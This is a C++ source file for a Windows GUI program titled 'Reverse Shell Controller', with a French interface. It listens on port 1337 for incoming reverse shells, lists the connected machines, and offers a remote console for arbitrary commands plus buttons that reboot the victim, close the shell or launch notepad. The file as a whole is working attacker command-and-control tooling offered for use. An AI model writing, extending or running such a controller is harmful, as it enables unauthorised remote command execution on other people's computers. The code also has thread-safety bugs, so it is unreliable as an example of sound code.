#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#ifdef APIENTRY
#undef APIENTRY
#endif

#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <Ws2tcpip.h>
#include <GLFW/glfw3.h>
#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"
#include <iostream>
#include <vector>
#include <thread>
#include <string>
#include <algorithm>

GLFWwindow* window = nullptr;
const char* glsl_version = "#version 130";
const char* WindowTitle = "Reverse Shell Controller";

struct ClientInfo {
    SOCKET socket;
    std::string hostname;
    std::string username;
    std::string ip;
    std::string buffer;
    bool connected = true;
};

std::vector<ClientInfo> clients;
int selectedClient = -1;
bool consoleOpened = false;

void glfw_error_callback(int error, const char* description) {
    std::cerr << "GLFW Error " << error << ": " << description << std::endl;
}

bool init_glfw() {
    glfwSetErrorCallback(glfw_error_callback);
    return glfwInit();
}

void setup_opengl_context() {
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);
}

bool create_window() {
    window = glfwCreateWindow(1280, 720, WindowTitle, nullptr, nullptr);
    if (!window)
        return false;
    glfwMakeContextCurrent(window);
    glfwSwapInterval(1);
    return true;
}

void setup_imgui_style() {
    ImGuiStyle& style = ImGui::GetStyle();
    ImVec4* colors = style.Colors;

    colors[ImGuiCol_WindowBg] = ImVec4(0.12f, 0.12f, 0.13f, 1.00f);
    colors[ImGuiCol_Header] = ImVec4(0.20f, 0.25f, 0.30f, 1.00f);
    colors[ImGuiCol_HeaderHovered] = ImVec4(0.30f, 0.35f, 0.40f, 1.00f);
    colors[ImGuiCol_HeaderActive] = ImVec4(0.25f, 0.30f, 0.35f, 1.00f);
    colors[ImGuiCol_Button] = ImVec4(0.20f, 0.45f, 0.60f, 1.00f);
    colors[ImGuiCol_ButtonHovered] = ImVec4(0.30f, 0.55f, 0.70f, 1.00f);
    colors[ImGuiCol_ButtonActive] = ImVec4(0.15f, 0.40f, 0.55f, 1.00f);
    colors[ImGuiCol_FrameBg] = ImVec4(0.20f, 0.25f, 0.30f, 1.00f);
    colors[ImGuiCol_FrameBgHovered] = ImVec4(0.25f, 0.30f, 0.35f, 1.00f);
    colors[ImGuiCol_FrameBgActive] = ImVec4(0.30f, 0.35f, 0.40f, 1.00f);
    colors[ImGuiCol_TitleBg] = ImVec4(0.10f, 0.10f, 0.12f, 1.00f);
    colors[ImGuiCol_TitleBgActive] = ImVec4(0.12f, 0.14f, 0.17f, 1.00f);
    colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.10f, 0.10f, 0.12f, 1.00f);

    style.WindowRounding = 6.0f;
    style.FrameRounding = 4.0f;
    style.GrabRounding = 4.0f;
    style.ScrollbarRounding = 6.0f;
}

bool init_imgui() {
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    ImGui::StyleColorsDark();
    setup_imgui_style();

    if (!ImGui_ImplGlfw_InitForOpenGL(window, true)) return false;
    if (!ImGui_ImplOpenGL3_Init(glsl_version)) return false;

    return true;
}

void handle_client(ClientInfo& client) {
    char buf[1024];
    while (client.connected) {
        int bytes = recv(client.socket, buf, sizeof(buf) - 1, 0);
        if (bytes > 0) {
            buf[bytes] = 0;
            client.buffer += std::string(buf);
        }
        else {
            client.connected = false;
            closesocket(client.socket);
            break;
        }
    }

    std::string target_ip = client.ip;
    clients.erase(
        std::remove_if(clients.begin(), clients.end(), [&](const ClientInfo& c) {
            return c.ip == target_ip;
            }),
        clients.end()
    );

    if (selectedClient >= clients.size())
        selectedClient = -1;

    consoleOpened = false;
}

bool ip_already_connected(const std::string& ip) {
    for (const auto& c : clients) {
        if (c.ip == ip) return true;
    }
    return false;
}

void start_server(unsigned short port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in server_addr = {};
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_socket, SOMAXCONN);

    std::thread([server_socket]() {
        while (true) {
            sockaddr_in client_addr;
            int addr_size = sizeof(client_addr);
            SOCKET client_socket = accept(server_socket, (sockaddr*)&client_addr, &addr_size);

            if (client_socket != INVALID_SOCKET) {
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &client_addr.sin_addr, ip, sizeof(ip));

                if (ip_already_connected(ip)) {
                    clients.erase(
                        std::remove_if(clients.begin(), clients.end(), [&](const ClientInfo& c) {
                            return c.ip == ip;
                            }),
                        clients.end()
                    );
                }

                ClientInfo new_client;
                new_client.socket = client_socket;
                new_client.ip = ip;
                new_client.hostname = "Machine";
                new_client.username = "Utilisateur";

                clients.push_back(new_client);
                std::thread(handle_client, std::ref(clients.back())).detach();
            }
        }
        }).detach();
}

void render_loop() {
    start_server(1337);
    static char cmd[1024] = "";

    while (!glfwWindowShouldClose(window)) {
        glfwPollEvents();

        clients.erase(
            std::remove_if(clients.begin(), clients.end(), [](const ClientInfo& c) {
                return !c.connected;
                }),
            clients.end()
        );
        if (selectedClient >= clients.size())
            selectedClient = -1;

        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame();

        // Machines connectées
        ImGui::SetNextWindowSize(ImVec2(300, 720), ImGuiCond_Always);
        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Always);
        ImGui::Begin("Machines connectées");
        for (int i = 0; i < clients.size(); ++i) {
            if (ImGui::Button(clients[i].ip.c_str(), ImVec2(-1, 0))) {
                selectedClient = i;
                consoleOpened = false;
            }
        }
        ImGui::End();

        if (selectedClient != -1 && selectedClient < clients.size()) {
            // Menu Machine
            ImGui::SetNextWindowSize(ImVec2(500, 200), ImGuiCond_Always);
            ImGui::SetNextWindowPos(ImVec2(310, 10), ImGuiCond_Always);
            ImGui::Begin("Menu Machine");
            ImGui::Text("Machine: %s", clients[selectedClient].ip.c_str());

            if (ImGui::Button("Ouvrir la console")) {
                consoleOpened = true;
            }

            if (ImGui::Button("Redémarrer la machine")) {
                const char* rebootCmd = "shutdown /r /t 0";
                send(clients[selectedClient].socket, rebootCmd, strlen(rebootCmd), 0);
            }

            if (ImGui::Button("Fermer le shell distant")) {
                const char* exitCmd = "exit";
                send(clients[selectedClient].socket, exitCmd, strlen(exitCmd), 0);
            }

            if (ImGui::Button("Lancer le bloc-notes")) {
                const char* notepadCmd = "start notepad.exe";
                send(clients[selectedClient].socket, notepadCmd, strlen(notepadCmd), 0);
            }

            ImGui::End();

            // Console distante
            if (consoleOpened) {
                ImGui::SetNextWindowSize(ImVec2(900, 400), ImGuiCond_Always);
                ImGui::SetNextWindowPos(ImVec2(310, 220), ImGuiCond_Always);
                ImGui::Begin("Console distante");

                ImGui::TextColored(ImVec4(1, 1, 0, 1), "Connexion à %s", clients[selectedClient].ip.c_str());

                ImGui::PushStyleColor(ImGuiCol_ChildBg, IM_COL32(0, 0, 0, 255));
                ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(0, 255, 0, 255));
                ImGui::PushFont(ImGui::GetIO().Fonts->Fonts[0]);

                ImGui::BeginChild("console_output", ImVec2(0, 300), true, ImGuiWindowFlags_AlwaysVerticalScrollbar);
                ImGui::TextWrapped("%s", clients[selectedClient].buffer.c_str());
                ImGui::EndChild();

                ImGui::PopStyleColor(2);
                ImGui::PopFont();

                ImGui::Separator();
                ImGui::InputText("Commande", cmd, sizeof(cmd));
                if (ImGui::Button("Envoyer")) {
                    send(clients[selectedClient].socket, cmd, strlen(cmd), 0);
                    strcat(cmd, "\n");
                }
                ImGui::End();
            }
        }

        ImGui::Render();
        int display_w, display_h;
        glfwGetFramebufferSize(window, &display_w, &display_h);
        glViewport(0, 0, display_w, display_h);
        glClearColor(0.1f, 0.1f, 0.1f, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());

        glfwSwapBuffers(window);
    }
}

void cleanup() {
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();

    if (window) glfwDestroyWindow(window);
    glfwTerminate();
    WSACleanup();
}

int main() {
    if (!init_glfw()) return -1;
    setup_opengl_context();
    if (!create_window()) return -1;
    if (!init_imgui()) return -1;

    render_loop();
    cleanup();
    return 0;
}